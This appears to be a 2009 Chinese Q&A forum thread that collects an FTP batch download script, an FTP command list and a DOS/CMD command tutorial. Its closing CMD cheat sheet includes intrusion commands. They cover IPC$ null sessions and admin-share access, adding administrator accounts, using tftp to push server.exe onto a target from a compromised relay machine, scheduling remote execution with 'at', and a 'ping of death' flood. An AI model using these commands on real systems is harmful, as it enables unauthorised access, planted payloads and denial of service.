open FTP地址
FTP用户名
FTP密码
ascii(这里是文本文件格式。若是二进制数据用binary)
cd 目录
get xxx.exe
bye 
==============
曾经做过一个自动下载IP脚本，看看吧
@echo off
echo open FTP地址>GET_IP.LOG
echo FTP用户名>>GET_IP.LOG
echo FTP密码>>GET_IP.LOG
echo ascii>>GET_IP.LOG
echo cd upload>>GET_IP.LOG
echo get IP.txt>>GET_IP.LOG
echo bye >>GET_IP.LOG
ping 127.0 -n 2 >nul
ftp -s:GET_IP.LOG 
del GET_IP.LOG 回答者： m1grand | 五级 | 2009-10-13 00:50 
           把你的路径给我，我来写一个给你。 回答者： 360安全士兵 | 六级 | 2009-10-13 20:44 
           cd \
ftp :*.*.*.*
anonymous
123
ls
cd ???
binary
get *.* 
//OK



FTP的命令行格式为： ftp -v -d -i -n -g [主机名] ，其中 -v 显示远程服务器的所有响应信息； -n 限制ftp的自动登录，即不使用； .n etrc文件； -d 使用调试方式； -g 取消全局文件名。 

ftp使用的内部命令如下(中括号表示可选项): 

1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如： !ls*.zip. 

2.$ macro-ame[args]：执行宏定义macro-name. 

3.account[password]：提供登录远程系统成功后访问系统资源所需的补 充口令。 

4.append local-file[remote-file]：将本地文件追加到远程系统主机， 若未指定远程系统文件名，则使用本地文件名。 

5.ascii：使用ascii类型传输方式。 

6.bell：每个命令执行完毕后计算机响铃一次。 

7.bin：使用二进制文件传输方式。 

8.bye：退出ftp会话过程。 

9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 

10.cd remote-dir：进入远程主机目录。 

11.cdup：进入远程主机目录的父目录。 

12.chmod mode file-name：将远程主机文件file-name的存取方式设置为 mode，如： chmod 777 a.out 。 

13.close：中断与远程服务器的ftp会话(与open对应)。 

14.cr：使用asscii方式传输文件时，将回车换行转换为回行。 

15.delete remote-file：删除远程主机文件。 

16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命 令，如： deb up 3，若设为0，表示取消debug。 

17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本 地文件local-file。 

18.disconnection：同close。 

19.form format：将文件传输方式设置为format，缺省为file方式。 

20.get remote-file[local-file]： 将远程主机的文件remote-file传至 本地硬盘的local-file。 

21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名， 同命令行的-g参数。 

22.hash：每传输1024字节，显示一个hash符号(#)。 

23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 

24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。 

25.image：设置二进制传输方式(同binary)。 

26.lcd[dir]：将本地工作目录切换至dir。 

27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本 地文件local-file。 

28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结 束。 

29.mdelete[remote-file]：删除远程主机文件。 

30.mdir remote-files local-file：与dir类似，但可指定多个远程文件， 如： mdir *.o.*.zipoutfile 。 

31.mget remote-files：传输多个远程文件。 

32.mkdir dir-name：在远程主机中建一目录。 

33.mls remote-file local-file：同nlist，但可指定多个文件名。 

34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方 式。 

35.modtime file-name：显示远程主机文件的最后修改时间。 

36.mput local-file：将多个文件传输至远程主机。 

37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同 名文件的时间更近，则重传该文件。 

38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并 存入本地硬盘的local-file。 

39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输 时，文件中的某些字符相互转换，如：nmap $1.$2.$3[$1，$2].[$2，$3]，则 传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX 机的情况。 

40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans 1R，则文件名LLL将变为RRR。 

41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 

42.passive：进入被动传输方式。 

43.prompt：设置多个文件传输时的交互提示。 

44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许 连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open， 以首先建立两个服务器间的连接。 

45.put local-file[remote-file]：将本地文件local-file传送至远程主 机。 

46.pwd：显示远程主机的当前工作目录。 

47.quit：同bye，退出ftp会话。 

48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如： quote syst. 

49.recv remote-file[local-file]：同get。 

50.reget remote-file[local-file]：类似于get，但若local-file存在， 则从上次传输中断处续传。 

51.rhelp[cmd-name]：请求获得远程主机的帮助。 

52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态，否 则显示文件状态。 

53.rename[from][to]：更改远程主机文件名。 

54.reset：清除回答队列。 

55.restart marker：从指定的标志marker处，重新开始get或put，如： restart 130。 

56.rmdir dir-name：删除远程主机目录。 

57.runique：设置文件名唯一性存储，若文件存在，则在原文件后加后缀 ..1，.2等。 

58.send local-file[remote-file]：同put。 

59.sendport：设置PORT命令的使用。 

60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。 

61.size file-name：显示远程主机文件大小，如：site idle 7200。 

62.status：显示当前ftp状态。 

63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时 使用stream结构。 

64.sunique：将远程主机文件名存储设置为唯一(与runique对应)。 

65.system：显示远程主机的操作系统类型。 

66.tenex：将文件传输类型设置为TENEX机的所需的类型。 

67.tick：设置传输时的字节计数器。 

68.trace：设置包跟踪。 

69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如： type binary，设置二进制传输方式。 

70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如： umask 3。 

71.user user-name[password][account]：向远程主机表明自己的身份， 需要口令时，必须输入口令，如：user anonymous my@email。 

72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp服务器的所有 响应都将显示给用户，缺省为on. 

73.?[cmd]：同help. 回答者： 咱继续张望 | 四级 | 2009-10-15 17:22 
           cd     改变当前目录       sys   制作DOS系统盘 

  copy    拷贝文件         del   删除文件 

  deltree   删除目录树        dir   列文件名 

  diskcopy  制磁盘          edit  文本编辑 

  format    格式化磁盘        md   建立子目录 

  mem     查看内存状况       type  显示文件内容 

  rd     删除目录         ren   改变文件名 

  记得多少啊，忘了就去上课看看，下面四个命令是新的，给出命令格式，你自己试试看，学电脑重要的就是摸索。 

  cls     清屏 

〔适用场合〕  屏幕上太乱了，或是屏幕上出现乱码了， 清除屏幕上显示内容但不
        影响电脑内部任何信息 

〔用  法〕  cls  回车 

  move     移动文件，改目录名  

〔适用场合〕  移动文件到别的目录 

〔用  法〕  move [文件名] [目录]        移动文件至新目录下 

        move [目录名] [目录名]       改目录名 


〔例  子〕  c:>move c:autoexec.bat c:old� 

        移动autoexec.bat文件至old目录下 

        c:>move c:config.sys c:temp� 

        移动config.sys文件至old目录下 


  more    分屏显示 

〔适用场合〕  当输出很多一屏显示不下时采用，几乎适合所有命令，尤其是type
        等命令时很有用。 使用more时磁盘不能有写保护，也不适合光驱。 

〔用  法〕  type [文件名] | more        分屏显示文件内容 

        more < [文件名]          分屏显示文件内容 


〔例  子〕  C:>type msdos.w40 | more 

  xcopy    拷贝目录和文件 

〔适用场合〕  在进行连同子目录一起拷贝时很有用，在拷贝大量文件时比COPY命令
        要快得多 

〔用  法〕  xcopy [文件名] [目录]       将指定文件拷贝到指定目录 

        xcopy [源目录] [目的目录]  将源目录连子目录考到目的目录下 

        xcopy *.* [目录] /s   将文件与非空子目录拷贝到指定目录 

        其它常用参数还有: v 拷贝后校验，会影响速度
                  e 与s 相似，但即使子目录是空的也会拷贝。
第2、比较常用的命令

  attrib   设置文件属性 

〔适用场合〕  想对文件做较特殊的处理时 

〔用  法〕  attrib 显示所有文件的属性 

        attrib +r或-r [文件名] 设置文件属性是否为只读 

        attrib +h或-h [文件名] 设置文件属性是否隐含 

        attrib +s或-s [文件名] 设置文件属性是否为系统文件 

        attrib +a或-a [文件名] 设置文件属性是否为归档文件 

        attrib /s 设置包括子目录的文件在内的文件属性 

〔例  子〕  C:TEST>attrib +r wina20.386 

        C:>attrib +h *.* /s� 隐含所有文件 

  date     显示及修改日期 

〔适用场合〕  想知道或修改时间和日期 

〔用  法〕  date 显示和改变当前日期 

〔例  子〕  C:>date 09-20-1996� 将日期改为1996年9月20日 

        C:>date� 

          Current date is Tue 08-20-1996 

          Enter new date (mm-dd-yy):09-20-1996 

          按月-日-年的顺序修改当前日期 直接按回车键忽略修改日期 


  lable    设置卷标号 

〔适用场合〕  用来为磁盘做个标记 

〔用  法〕  label 显示磁盘卷标 

        label [盘符] [卷标名] 设定指定盘的卷标 

〔例  子〕  C:>label� 
        Volume in drive C is WANG 
        Volume Serial Number is 2116-1DD0 
        volume label (11 characters,Enter for none)? 
        可以输入卷标，直接回车后 
        Delete current volume label (Y/N)? 
        按y删除旧卷标，按n不更改 

  defrag   磁盘碎片整理 

〔适用场合〕  磁盘读写次数很多，或磁盘使用时间很长了，可能需要使用这条命令
        整理磁盘。磁盘碎片并不是指磁盘坏了，而只是由于多次的拷贝和删
        除文件后，磁盘使用会很不连贯，致使速度变慢。 

〔用  法〕  1. C:>defrag� 

        2. 选择要整理的磁盘


  doskey   调用和建立DOS宏命令 

〔适用场合〕  经常需要输入重复的命令时，有非常大的用处 

〔用  法〕  doskey  

        将doskey驻留内存，开辟出缓冲区，以后输入的命令都将保存在缓冲
        区中，可以随时调用 

        doskey [宏命令名]=[命令名]   

        将宏命令定义为命令，以后输入宏命令，电脑就会执行相应的命令 

        doskey /reinstall      重新安装doskey 

        doskey /bufsize=       设置缓冲区的大小 

        doskey /macros        显示所有doskey宏 

        doskey /history        显示内存中所有命令 

        doskey /insert|overstrike 设置新键入的字符是否覆盖旧的字符 

〔例  子〕  C:>DOSKEY� 
        C:>dir 
        C:>copy C:temp*.* a: 
        C:>del c:temp*.* 
        C:>copy b:*.* c:temp 

        上述四条命令都已被保存，用光标控制键的上下可以依次选择使用或
        修改, 也可以用F7键列出保存的所有命令

        C:>doskey di=dir/w/p� 定义di为宏命令，意思是执行dir/w/p 

  fdisk    硬盘分区 

〔建  议〕  只有硬盘被很利害的病毒感染时，或是一块新硬盘才需要分区，最好
        请懂行的人指导。硬盘都需经过低级格式化，分区，格式化三个步骤
        才可使用，成品电脑内的硬盘都已经做过这些加工了。 

〔用  法〕  输入fdisk后按回车即可进入提示界面 


  emm386   扩展内存管理 

〔建  议〕  这条命令比较复杂，在第五章中系统配置里将详细介绍 

lh/loadhigh   将程序装入高端内存 

〔适用场合〕  这条命令一般用在autoexec.bat中，当有些软件需要的基本内存很大
        时，它会有用 

〔用  法〕  lh [程序]   

        将程序装入高端内存 使用此命令时，config.sys文件中需有下面两
        条语句。 device=emm386.exe dos=umb 

        lh [程序] /l:区号    将程序装入指定的umb区 

        lh /s          一般是由memmaker专用 

〔例  子〕  C:MOUSE>lh mouse�  将鼠标驱动程序装入高端内存 

 memmaker   内存优化管理 

〔适用场合〕  这个命令现在已经很少用了，在当年DOS流行时，想玩游戏可少不了 
        它，它可以腾出许多基本内存供游戏使用，只需安装一次即可 

〔用  法〕  1. C:>memmaker� 

        2. 回车继续，F3退出 

        3. 选择手动安装和自动安装，直接回车表示自动安装（回车得了） 

        4. 选择是否有程序需要扩充内存，可用空格键选择，Yes表示需要，
        No不需要，按回车键即可。 

        5. 程序自动检测硬盘内是否安装了WINDOWS 

        6. 软驱中若有软盘则应将其取出，然后按回车键，电脑将重新起动
        两次，不要中断，只需按回车键。 

        （其实很简单，一直按回车键就行了，呵呵） 



  msd     系统检测 

〔适用场合〕  用于检查系统信息 

〔用  法〕  1. C:>msd 回车后可见到，在每个选项旁边加了注解，表
        示该按钮的功用 

       2. 选择需查询的项目，比如选第一个Computer,将会弹出一个对话框
        显示电脑的一些基本信息。你可以试试其他的选项，看看有什么用。
       3. 按Alt+F键激活下拉菜单后, 选择"Exit"项退出。 

 undelete   恢复被删除的文件 

〔适用场合〕  当不小心删错了文件时，它可以用得上。 

        DOS删除文件时，只是将文件从分配表中去除，在磁盘存储区内将文
        件名的第一个字母删除，文件内容并未马上从磁盘中删除，所以能恢
        复。 

〔用  法〕  undelete       恢复已删除的文件 

        undelete /all   恢复文件且不再询问是否恢复，      
        以"#%&-0123456789abcdefghijklmnopqrstuvwxyz"的顺序为第一个
        字母来恢复文件 

        undelete /list  列可恢复的文件名 

        undelete /s    可将undelete驻留内存，但几乎没人这样使用 


 prompt   设置提示符 

〔适用场合〕  当你厌烦了c:>的提示符或者您想使您的提示符与众不同时，您可以
        试一试，非常有趣的DOS命令，可以随时显示时间与日期。 

〔用  法〕  prompt $p$g 以当前目录名和>号为提示符，这是最常用的提示符 

        prompt $t 表示时间      prompt $d 表示日期 

        prompt $$ 表示$        prompt $q 表示= 

        prompt $v 表示当前版本    prompt $l 表示< 

        prompt $b 表示|        prompt $h 表示退位符 

        prompt $e 表示Esc代表的字符  prompt $_ 表示回车换行 

〔例  子〕  C:DOS>prompt wang$g� 将wang>作为提示符 

        WANG>prompt $t$d$g�  使用时间、日期和>号做为提示符 

        0:01:07.77Thu 08-29-1996>prompt $p$g� 

        C:DOS> 

 restore   恢复已备份的文件 

〔建  议〕  如果以前用backup做过文件备份，则当原文件损坏时可以用它来恢复
        文件。 

        将用backup命令备份的磁盘中的文件恢复到另一磁盘中，备份磁盘中
        应有backup.00X和control.00X这两条文件。 

〔用  法〕  restore [备份盘符] [目标盘符] 

        将备份盘上备份文件恢复到指定盘上 

        restore /s     将备份文件包括子目录都恢复到指定盘上 

        restore /p     让用户判断是否恢复文件 

        restore /b:日期  恢复日期以前的文件 

        restore /a:日期  恢复日期之后的文件 

        restore /l:时间  恢复时间之前的文件 

        restore /e:时间  恢复时间之后的文件 

        restore /m     只恢复上次备份后修改过的文件 

        restore /n     只恢复上次备份后已删 除的文件 

        restore /d     只显示要恢复的文件名 

〔例  子〕  C:DOS>restore a: c:� 
        Insert backup diskette 01 in drive A: 
        Press any key to continue . . . 

        在A驱中放入第一张备份盘，按任意键即可，恢复完第一张后，按顺
        序放入其它盘即可。 

        当您用上述命令不能正确恢复文件时请用： 

        C:DOS>restore a: c: /s� 


  time    显示及修改时间 

〔适用场合〕  用于显示及修改时间，用法同date 

〔例  子〕  C:DOS>time� 
        Current time is 12:15:26.04a 
        Enter new time: 11:20:20.00p 

        按时:分顺序输入时间，再加上下午(a/p)即可 直接按ENTER键可忽略
        修改时间。 

  set     设置环境变量 

〔适用场合〕  设置声卡和路径等时用到 

〔用  法〕  set [环境变量]=[字符串]    

        这条命令常常用在autoexec.bat中 

〔例  子〕  C:>set blaster=a220 i5 d1     设置声卡的参数 

        C:>set path=c:dos         path c:dos含义相同 

 smartdrv   设置磁盘加速器 

〔建  议〕  它可以提高硬盘访问速度，最好在autoexec.bat文件中加载吧。 

〔用  法〕  smartdrv /x 

        执行并驻留内存，开辟磁盘加速缓存区，并屏蔽所有驱动器缓存，是
        较常用的方法（一般用这个命令就够了） 

        smartdrv /c       将缓存内的信息都写入硬盘 

        smartdrv /e: 数字    设置一次移动的信息量 

        smartdrv /b: 数字    设置预先读取的缓冲区大小
第3、不常用的命令

 append    设置非执行文件的路径 

〔适用场合〕  当您无法在多个目录中寻找到自己输入的文稿时，可以试一试这个命
        令，用法类似path。 

〔用  法〕  append [路径];[路径] 


〔例  子〕  C:>append c:test� 

        设置寻找非可执行文件路径为c:test如果该目录下有文件1.txt时，
        在其它目录下调用1.txt找不到时，可自动寻找到c:test目录。 

        D:UCDOS>edit 1.txt 可找到C:test1.txt文件 

 debug     程序调试命令 

〔建  议〕  如果你学过汇编语言，那你应该会使用debug，如果没学过，最好别
        使用 

〔用  法〕  debug [文件名] 

 diskcomp   比较磁盘 

〔适用场合〕  比较两张盘是否相同，没想到什么时候会用到，在比较用diskcopy拷
        贝的两张盘，为什么不用diskcopy/v校验呢？ 

〔用  法〕  diskcomp [盘符1] [盘符2] 比较盘1和盘2 

        diskcomp /1 只比较磁盘的第一面 

        diskcomp /8 只比较没磁道的前8个扇区 

〔例  子〕  C:>diskcomp a: a: 
        在同一软驱中比较两张盘 

        Insert FIRST diskette in drive A: 
        放入第一张盘 

        Press any key to continue . . . 

        Comparing 80 tracks 18 sectors per track, 2 side(s)   
        Insert SECOND diskette in drive A: 
        放入第二张盘 

        Press any key to continue . . . Compare OK 
        比较未发现不同 

        Compare another diskette (Y/N) ?n 
        是否比较其它盘，选y继续比较，选n停止 


 expand    解压工具 

〔适用场合〕  微软公司软件原始安装盘中有许多后缀以"_"结尾的压缩文件，可以 
        用它解压，解除您因为少数几个文件丢失造成的麻烦。 

〔用  法〕  expand [源文件名] [目的文件] 


〔例  子〕  C:>expand a:vsafe.co_ c:dosvsafe.com 

      � 解压vsafe.co_为vsafe.com文件 

        microsoft (R) File Expansion Utility Version 2.10    
        Copyright (C) Microsoft Corp 1990-1993. All rights    
        reserved. 

        Expanding a:vsafe.co_ to c:dosvsafe.com. a:vsafe.co_: 
        33046 bytes expanded to 62576 bytes, 89% increase. 

        C:DOS> 

 fasthelp   快速显示帮助信息 

〔建  议〕  可以看看所有的命令，对于单个的命令，还不如在命令名后加/?参数
        方便 

〔用  法〕  fasthelp       列出所有DOS命令的用处 

        fasthelp [命令名]  显示命令的用处，等价于 [命令名]/? 

   fc    文件比较 

〔建  议〕  也许对于大多数人是永远不会用到它的 

〔用  法〕  fc [文件名1] [文件名2]     比较两文件的不同       
        参数还有: a c l Lbn n t w nnnn 

〔例  子〕  C:TEST>fc a.bat b.bat� 
        Comparing files A.BAT and B.BAT 
        ***** A.BAT 
        choice /c:dme defrag,mem,end 
        if errorlevel 3 goto defrag 
        if errorlevel 2 goto mem 
        if errotlevel 1 goto end 
        ***** B.BAT choice /c:dme defrag,mem,end 
        ***** C:TEST> 


 interlnk   启动简易网客户机 

〔适用场合〕  如果有两台电脑可以通过它和intersvr联成简易的网络，这是条很有
        用的命令，但不常用 

〔用  法〕   DOS新增支持网络的功能， 
        它可以使两台电脑通过并口线或串口线相联组成简易的网络 
        使用interlnk 必须在config.sys中增添一句： 
        device=c:dosinterlnk 
        并口线的两头都应是25针公接头，针之间的连接如下图：对应 
        p2------------------------p15 
        p3------------------------p13 
        p4------------------------p12 
        p5------------------------p10 公接头指接头为带针的 
        p6------------------------p11 母接头指接头为带孔的 
        p15-----------------------p2 
        p13-----------------------p3 
        p12-----------------------p4 
        p10-----------------------p5 
        p11-----------------------p6 
        p25-----------------------p25 地线 


〔例  子〕  C:DOS>interlnk Port-LPT1 

        this Computer    Other Computer 

         (Client)       (Server) 

          ---------------------------------------- 

            E:   equals   A: 

            F:   equals   C: 

        在客户机中E盘即为服务机的A盘，F盘为服务机的C盘 

 intersvr   启动简易网服务器 

〔适用场合〕  使用它，电脑就成了服务器了（只限与DOS提供的简易网） 

〔用  法〕  intersvr       启动服务机 

        intersvr /lpt:1   启动服务机,用lpt1口作为数据传输口 

        intersvr /com:1   启动服务机,用com1口作为数据传输口 

        参数还有 x baud: b v rcopy （参见interlnk) 

〔例  子〕  C:DOS>intersvr� 

  qbasic   启动Basic集成环境 

〔建  议〕  也许对于大多数人是永远不会用到它的 

〔用  法〕  如果会qbasic语言，那么可以利用它编写自己的程序。edit.com必须
        有它才可用。 

        qbasic     起动basic语言环境 

        qbasic/editor 以全屏方式编辑语言 

        参数还有： b g h mbf nohi run 

〔例  子〕  C:DOS>qbasic� 




 setver     设置版本 

〔适用场合〕  当希望使用其它版本的dos命令时可以用它来欺骗电脑。在高版本  
        DOS中，某些旧版本程序需要DOS3.3时，可用setver来设置 

〔用  法〕  使用时一般在config.sys中加入 device=setver.exe 

        setver          显示文件的版本 

        setver [文件名] n.nn   设置指定文件的版本号 


〔例  子〕  C:DOS>setver� 
        KERNEL.EXE 5.00 
        DOSOAD.SYS 5.00 
        EDLIN.EXE 5.00 
        BACKUP.EXE 5.00 
        ASSIGN.COM 5.00 
        EXE2BIN.EXE 5.00 
        JOIN.EXE 5.00 
        RECOVER.EXE 5.00 
        WINWORD.EXE 4.10 
        C:> 

        若程序AAA.exe必须在MS-DOS3.3下执行，则键入 

        C:DOS>setver aaa.exe 3.30� 

        又如net5.exe仅在MS-DOS5.0下执行，则在config.sys中加入   
        device=setver.exe后也可在Ms-DOS6.22下运行。 

  share    文件共享 

〔建  议〕  只有在软件声明必须要运行它时才用 

〔用  法〕  可在config.sys中加入 install=share.exe 也可直接运行    
        参数有 f l 

  subst    路径替换 

〔建  议〕  一个非常有趣的命令，如果经常用光碟软件，可能有用。 

〔用  法〕  subst           显示当前的替代路径 

        subst [盘符] [路径]                    
        将指定的路径替代盘符，该路径将作为驱动器使用 

        subst /b         解除替代 

〔例  子〕  C:DOS>subst a: c:temp� 用c盘temp目录替代a盘 

        C:>subst a: /d�     解除替代 


  tree     显示命令树结构 

〔适用场合〕  查看所有的子目录 

〔用  法〕  tree [盘符]    显示所有的子目录树 

        tree /f      显示目录时同时显示文件名 

        tree /a      以ASCII码显示目录树 


〔例  子〕  C:WINDOWS>tree /a� 

 unformat   恢复已被格式化的磁盘 

〔建  议〕  你把有重要信息的软盘格式化了?快用unformat……什么?你用了  
        format /u，那死定了 

〔用  法〕  unformat [盘符]    恢复指定的被格式化的磁盘 

        unformat /l      显示unformat所找到的文件名 

〔例  子〕  C:WINDOWS>unformat a:� 


  vsafe    病毒防护程序 

〔建  议〕  把它装入内存可以随时检测出许多种病毒，是比较有用的。 

〔用  法〕  vsafe        加载vsafe在内存中 

        vsafe /u       从内存中去除vsafe 

        vsafe/ne       将vsafe装入扩充内存 

        vsafe/nx       将vsafe装入扩展内存 

        参数还有 Ax Cx n d 

〔例  子〕  C:>vsafe 


 ver     显示DOS版本 

〔例  子〕  C:>ver 

       �MS-DOS Version 6.22 

        C:> 

  vol     显示指定的磁盘卷标号 

〔例  子〕  C:>vol� 

        Volume in drive C is Wang 

        Volume Serial Number is 2116-1DD0 

        C:> 


  ctty    改变控制设备 

〔建  议〕  用来改变控制的输入输出设备，可以试试这条命令，不过恐怕不会有
        什么作用，是DOS中最没用的命令之一 

〔用  法〕  ctty [设备名]    设置控制台 

〔例  子〕  C:>ctty aux�    设置aux为输入输出设备 



CMD命令 
net use ipipc$ " " /user:" " 建立IPC空链接 
net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接 
net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
net use h: ipc$ 登陆后映射对方C：到本地为H: 
net use ipipc$ /del 删除IPC链接 
net use h: /del 删除映射对方到本地的为H:的映射 
net user 用户名 密码 /add 建立用户 
net user guest /active:yes 激活guest用户 
net user 查看有哪些用户 
net user 帐户名 查看帐户的属性 
net localgroup administrators 用户名 /add 把"用户"添加到管理员中使其具有管理员权限,注意： 
administrator后加s用复数 
net start 查看开启了哪些服务 
net start 服务名 开启服务；(如:net start telnet， net start schedule) 
net stop 服务名 停止某服务 
net time 目标ip 查看对方时间 
net time 目标ip /set 设置本地计算机时间与"目标IP"主机的时间同步,加上参数/yes可取消确认信息 
net view 查看本地局域网内开启了哪些共享 
net view ip 查看对方局域网内开启了哪些共享 
net config 显示系统网络设置 
net logoff 断开连接的共享 
net pause 服务名 暂停某服务 
net send ip "文本信息" 向对方发信息 
net ver 局域网内正在使用的网络连接类型和信息 
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net share ipc$ /del 删除ipc$共享 
net share c$ /del 删除C：共享 
net user guest 12345 用guest用户登陆后用将密码改为12345 
net password 密码 更改系统登陆密码 
netstat -a 查看开启了哪些端口,常用netstat -an 
netstat -n 查看端口的网络连接情况，常用netstat -an 
netstat -v 查看正在进行的工作 
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
netstat -s 查看正在使用的所有协议使用情况 
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数："-w数字"用于设置超时间隔。 
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数："-l[空格]数据包大小"；"-n发送数据次数"；"-t"指一直 
ping。 
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参 
数"/all"显示全部配置信息 
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A- 
H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如"DEL/AR *.*"表示删除当前目录下所有只读文件，"DEL/A- 
S *.*"表示删除当前目录下除系统文件以外的所有文件 
二： 
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统 
确认就直接删除。（二个命令作用相同） 
move 盘符路径要移动的文件名 存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命 
令 
at id号 开启已注册的某个计划任务 
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
at id号 /delete 停止某个已注册的计划任务 
at 查看所有的计划任务 
at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
finger username @host 查看最近有哪些用户登陆 
telnet ip 端口 远和登陆服务器,默认端口为23 
open ip 连接到IP（属telnet登陆后的命令） 
telnet 在本机上直接键入telnet 将进入本机的telnet 
copy 路径文件名1 路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下 
cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注： 
2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文 
件）至本地C： 
xcopy 要复制的文件或目录树 目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将"IP"的 
server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式 
（传送文本文件模式）进行传送 
tftp -i 对方IP put c:server.exe 登陆后，上传本地c:server.exe至主机 
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文 
本文件时) 
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway 
addres，接口地址Interface 
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
mem 查看cpu使用情况 
attrib 文件名(目录名) 查看某文件（目录）的属性 
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某 
属性 
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 
date /t 、 time /t 使用此参数即"DATE/T"、"TIME/T"将只显示当前日期和时间，而不必输入新日期和时间 
set 指定环境变量名称=要指派给变量的字符 设置环境变量 
set 显示当前所有的环境变量 
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
pause 暂停批处理程序，并显示出：请按任意键继续.... 
if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如："：start"标签） 
call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
echo 信息 在屏幕上显示出信息 
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
find 文件名 查找某文件 
title 标题名字 更改CMD窗口标题名字 
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡 
绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky ) 
三： 
ver 在DOS窗口下显示版本信息 
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
md 目录名 创建目录 
replace 源文件 要替换文件的目录 替换文件 
ren 原文件名 新文件名 重命名文件名 
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
type 文件名 显示文本文件的内容 
more 文件名 逐屏显示输出文件 
doskey 要锁定的命令＝字符 
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey 
dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
taskmgr 调出任务管理器 
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
